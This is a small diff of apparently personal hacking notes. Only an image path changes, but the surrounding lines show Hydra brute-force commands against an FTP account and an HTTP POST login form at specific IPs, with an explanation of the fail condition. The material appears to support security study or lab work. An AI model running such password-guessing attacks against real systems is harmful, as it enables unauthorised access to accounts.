@@ -21,7 +21,7 @@ hydra -l "fiona" -P /home/breezy/Downloads/pws.list -s 21 -t 2 -c 1 -vV -f 10.12
 hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt  154.57.164.65 -s 37581 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
 ```
 In this example we are using the inputfields of the HTML-form `name="username"` and `name="password"`. The "fail-condition" (which filters all failed attempts, meaning responses which contain it's value) here is `Invalid credentials`:
-![](00-Meta/Objects/Pictures/Pasted%20image%2020261015113150.png)
+![](/00-Meta/Objects/Pictures/Pasted%20image%2020261015113150.png)
 #### Bruteforcing HTTP (GET) - Hydra
 
 ##### Without form
